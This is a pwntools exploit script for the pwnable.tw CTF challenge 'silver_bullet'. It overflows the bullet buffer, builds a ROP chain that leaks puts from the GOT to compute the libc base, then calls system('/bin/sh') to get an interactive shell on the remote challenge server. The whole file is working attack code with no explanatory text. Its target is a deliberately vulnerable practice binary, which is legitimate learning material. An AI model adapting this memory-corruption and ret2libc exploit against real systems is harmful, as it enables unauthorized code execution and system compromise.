from pwn import *

#s = process('./silver_bullet', env={'LD)PRELOAD':'./libc.so.6'})
s = remote('chall.pwnable.tw', 10103)
#elf = ELF('./silver_bullet')
libc = ELF('./libc.so.6')

#offset = libc.symbols['puts'] - libc.symbols['system']
puts_plt = 0x080484A8
puts_got = 0x0804AFDC
libc_puts = 0x0005F140
main_addr = 0x08048954
ppppr_addr = 0x08048a78

def create(bullet):
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('bullet :')
	s.send(bullet)
	s.recvuntil('Good luck !!')

def powerup(bullet):
	s.recvuntil('Your choice :')
	s.sendline('2')
	s.recvuntil('bullet :')
	s.send(bullet)
	s.recvuntil('Enjoy it !')

def beat():
	s.recvuntil('Your choice :')
	s.sendline('3')
	s.recvuntil('win !!\n')

create('A'*47)
powerup('A' * 1) #set power as 1

#leak puts
payload = '\xff' * 7
payload += p32(puts_plt)
payload += p32(ppppr_addr + 3)
payload += p32(puts_got)
payload += p32(main_addr)

powerup(payload)

# get libc_addr
beat()
puts_addr = u32(s.recv(4))
log.info('puts_addr : ' + hex(puts_addr))

libc_base = puts_addr - libc_puts
log.info('libc_base : ' + hex(libc_base))

sh = libc_base + list(libc.search('/bin/sh\x00'))[0] 
log.info('libc_sh : ' + hex(sh))

#print hex(puts_addr - offset)
system_addr = libc_base + libc.symbols['system']
log.info('system ' + hex(system_addr))

#again main()
create('A'*47)
powerup('A' * 1) #set power as 1

#system(/bin/sh)
payload = '\xff' * 7
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(sh)

powerup(payload)
beat()

s.interactive()
